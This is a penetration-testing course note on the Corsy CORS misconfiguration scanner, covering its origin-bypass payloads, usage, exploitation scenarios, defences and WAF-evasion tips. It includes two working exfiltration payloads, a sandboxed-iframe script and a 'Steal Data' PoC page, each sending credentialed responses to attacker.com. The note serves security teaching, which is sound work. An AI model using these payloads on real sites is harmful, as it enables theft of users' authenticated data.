---
tags: [tools, web-testing, exploiter, vapt]
difficulty: advanced
module: "59 - Complete Tools Reference"
topic: "59.37 corsy CORS Scanner"
---

# corsy CORS Scanner

## 1. Introduction to CORS and Corsy

Cross-Origin Resource Sharing (CORS) is a browser security mechanism that relaxes the Same-Origin Policy (SOP). It allows a web server to explicitly permit cross-origin requests from specified domains. When implemented incorrectly, CORS misconfigurations can allow attackers to perform Cross-Site Request Forgery (CSRF) or extract sensitive user data, bypassing the intended SOP constraints.

**Corsy** is a lightweight, high-performance tool written in Python that automates the discovery of CORS misconfigurations. By simulating various origin configurations and parsing the server's responses, Corsy determines if a target URL reflects arbitrary origins or allows potentially dangerous cross-origin behaviors. It is an essential tool in both bug bounty hunting and penetration testing for rapidly assessing API and web application security boundaries.

## 2. Under the Hood: The Mechanics of Corsy

Corsy works by systematically sending a series of HTTP requests to a target, each with a carefully crafted `Origin` header. It then inspects the `Access-Control-Allow-Origin` (ACAO) and `Access-Control-Allow-Credentials` (ACAC) headers in the response.

A vulnerability is typically flagged if:
1. The `Access-Control-Allow-Origin` matches the attacker-controlled origin sent in the request.
2. The `Access-Control-Allow-Credentials` is set to `true`, which means the browser will send session cookies or credentials with the cross-origin request, enabling authenticated data theft.

### 2.1 The Payload Dictionary

Corsy uses a predefined set of origin permutations designed to bypass poorly implemented regex or string-matching logic on the server. These permutations include:
- **Pre-domain:** `https://attacker.comtarget.com` (Checking if the server just ensures the string ends with the target).
- **Post-domain:** `https://target.com.attacker.com` (Checking if the server just ensures the string starts with the target).
- **Subdomain:** `https://attacker.target.com` (Validating wildcard subdomain trusting).
- **Null Origin:** `Origin: null` (Sometimes servers allow the `null` origin, which can be exploited via a sandboxed iframe).
- **Special Characters:** `https://target.com_attacker.com` or `https://target.com%60.attacker.com` (Testing regex flaws with unescaped characters or improper parsing).
- **HTTP vs HTTPS:** Testing if the server strictly enforces protocol schemes.

## 3. Architecture and Request Flow Diagram

```ascii
                      +-------------------+
                      |   CORSY SCANNER   |
                      +-------------------+
                               |
                   [Reads Target & Payloads]
                               |
    +--------------------------+--------------------------+
    |                          |                          |
[Payload 1]               [Payload 2]                [Payload N]
Origin: null        Origin: target.com.evil.com   Origin: evil.target.com
    |                          |                          |
    +--------------------------+--------------------------+
                               |
                      [HTTP Request Sender]
                               |
========================================================================
                      NETWORK BOUNDARY
========================================================================
                               |
                      [Target Application]
            (Evaluates Origin via Regex / Whitelist)
                               |
             +-----------------+-----------------+
             |                 |                 |
     (Response 1)        (Response 2)       (Response N)
  ACAO: null             ACAO: [Reflected]  ACAO: [Reflected]
  ACAC: true             ACAC: true         ACAC: false
             |                 |                 |
========================================================================
                               |
                      [Response Analyzer]
                               |
             +-----------------+-----------------+
             |                                   |
    [Flag Vulnerability]                 [Discard Result]
    (Null Origin Allowed)                (No ACAC / Not Reflected)
                               |
                      [Report Generation]
```

## 4. Usage and Syntax

Corsy is simple to operate. It can test a single URL or take an entire list of URLs, making it highly effective when combined with reconnaissance tools like `httpx` or `waybackurls`.

### 4.1 Basic Operations

**Testing a Single URL:**
```bash
python3 corsy.py -u https://api.target.com/user/profile
```

**Testing a List of URLs:**
If you have gathered a list of active endpoints:
```bash
python3 corsy.py -i targets.txt
```

### 4.2 Advanced Configuration

- **Concurrency:** By default, Corsy is single-threaded. You can increase the thread count for faster scanning across massive lists.
  ```bash
  python3 corsy.py -i targets.txt -t 50
  ```
- **Custom Headers:** Often, API endpoints require authentication to return sensitive data or proper headers. You can pass custom headers such as Authorization tokens or cookies.
  ```bash
  python3 corsy.py -u https://api.target.com -H "Authorization: Bearer <token>"
  ```
- **Delay:** To avoid rate-limiting or WAF bans, you can introduce a delay between requests.
  ```bash
  python3 corsy.py -i targets.txt -d 2
  ```

## 5. Analyzing Results and Exploitation

When Corsy reports a vulnerability, it categorizes it based on the severity and the type of misconfiguration discovered.

### 5.1 Case Study: Reflected Origin with Credentials

If Corsy outputs:
`[+] Vulnerability: Origin Reflection with Credentials`
`URL: https://api.target.com/data`
`Payload: https://target.com.attacker.com`

**Exploitation Scenario:**
An attacker registers `target.com.attacker.com`. They host a malicious script on this domain. When an authenticated user visits `target.com.attacker.com`, the malicious script issues an XMLHTTPRequest (XHR) or fetch to `https://api.target.com/data` with `credentials: 'include'`. The server validates the origin, accepts it, and reflects it back with `Access-Control-Allow-Credentials: true`. The browser allows the script to read the response, successfully exfiltrating the victim's sensitive data.

### 5.2 Case Study: The 'null' Origin

If Corsy outputs:
`[+] Vulnerability: Null Origin Allowed`
`URL: https://target.com/private`

**Exploitation Scenario:**
Some developers use `Origin: null` as a temporary fix for local testing or to allow pseudo-protocols like `file://`. An attacker can exploit this by placing the exploit code inside an iframe with the `sandbox` attribute. Sandboxed iframes send `Origin: null`. The server accepts it, and the data is leaked to the iframe, which can then communicate with the parent window or exfiltrate the data.

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
  var req = new XMLHttpRequest();
  req.onload = function() {
    fetch('http://attacker.com/log?data=' + btoa(this.responseText));
  };
  req.open('GET', 'https://target.com/private', true);
  req.withCredentials = true;
  req.send();
</script>"></iframe>
```

## 6. Defensive Considerations

To prevent CORS misconfigurations:
- **Avoid Dynamic Reflection:** Never blindly copy the `Origin` header from the request into the `Access-Control-Allow-Origin` response header.
- **Strict Allow-lists:** Maintain a strict list of allowed domains. When validating the origin against the allow-list, use strict equality or carefully reviewed parsing logic, avoiding ambiguous regex matching.
- **Do not allow `null`:** Avoid permitting the `null` origin.
- **Minimize ACAC:** Only set `Access-Control-Allow-Credentials: true` when absolutely necessary, and ensure it is never paired with a wildcard `*` or dynamically reflected untrusted origins.

## 7. Deep Dive: Corsy Core Logic

### 7.1 Python Implementation Details
Corsy relies heavily on the `requests` library. For performance, it implements `concurrent.futures.ThreadPoolExecutor` when the `-t` parameter is specified. This makes network IO non-blocking up to the maximum thread limit. 
It processes targets using a Queue system. Each URL is retrieved, all permutations are applied to the `Origin` header, and responses are checked asynchronously.

### 7.2 Interpreting False Positives
Sometimes servers echo back the origin *without* allowing credentials. While technically a misconfiguration, without `Access-Control-Allow-Credentials: true`, an attacker cannot perform authenticated data theft. Corsy highlights these as lower severity. Always manually verify findings.

## 8. Integration and Scripting

Corsy's output can be outputted to JSON format for easy parsing by other tools.
```bash
python3 corsy.py -i targets.txt -o results.json
```
This is useful in continuous monitoring pipelines where `jq` can be used to filter for high-severity issues.

## 9. Chaining Opportunities

- **CSRF:** CORS misconfigurations can bypass CSRF tokens if the tokens are readable via an authenticated cross-origin request. Read the token, then use it to submit a state-changing POST request. See [[20 - Cross-Site Request Forgery (CSRF)]].
- **XSS to CORS:** If you find XSS on a trusted sub-domain that is allowed by CORS on the main domain, you can execute scripts from the trusted sub-domain to access data on the highly restricted main domain. See [[18 - Cross-Site Scripting (XSS)]].
- **Account Takeover:** Stealing API keys or session identifiers via CORS often leads to direct ATO. See [[04 - Account Takeover Methodologies]].

## 10. Appendix: Comprehensive CORS Attack Playbook

### A.1 Manual Verification of Corsy Findings
When Corsy reports a vulnerability, you should manually verify it using `curl`:
```bash
curl -H "Origin: https://evil.com" -I https://api.target.com/endpoint
```
Look for:
`Access-Control-Allow-Origin: https://evil.com`
`Access-Control-Allow-Credentials: true`

### A.2 Advanced Exploit PoC Template
If a vulnerability is confirmed, use this template to demonstrate impact (e.g., in a bug bounty report):
```html
<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploitation PoC</title>
</head>
<body>
    <h2>CORS Data Exfiltration</h2>
    <button onclick="stealData()">Steal Data</button>
    <script>
        function stealData() {
            var xhr = new XMLHttpRequest();
            xhr.withCredentials = true; // Crucial for sending cookies
            xhr.open("GET", "https://api.target.com/sensitive_data", true);
            xhr.onload = function() {
                if (xhr.status === 200) {
                    // Send stolen data to attacker server
                    var exfilXhr = new XMLHttpRequest();
                    exfilXhr.open("POST", "https://attacker.com/log", true);
                    exfilXhr.setRequestHeader("Content-Type", "application/json");
                    exfilXhr.send(JSON.stringify({
                        target_data: xhr.responseText
                    }));
                    alert("Data successfully stolen and exfiltrated!");
                }
            };
            xhr.send();
        }
    </script>
</body>
</html>
```

### A.3 Edge Cases: Cache Deception via CORS
Sometimes, a server caches responses based on the `Origin` header. If an attacker sends a request with `Origin: https://evil.com` and the server caches the response containing `Access-Control-Allow-Origin: https://evil.com`, subsequent legitimate users might receive the poisoned cache, effectively granting the attacker CORS access to all users hitting that cached resource. This requires Corsy findings to be chained with Web Cache Poisoning techniques.

### A.4 Troubleshooting Corsy Runs
- **Rate Limiting:** If Corsy shows timeouts, the target WAF might be blocking based on request frequency. Use `-d 2` to add a 2-second delay.
- **WAF Blocking Payload:** If `Origin: target.com.evil.com` is blocked, try URL encoding the Origin or using varying HTTP methods.

## 11. Related Notes

- [[07 - Cross-Origin Resource Sharing Architecture]]
- [[40 - Understanding Browser Security Policies]]
- [[21 - Advanced API Penetration Testing]]
- [[52 - Reconnaissance with httpx and waybackurls]]
- [[08 - Introduction to Bug Bounty Workflows]]
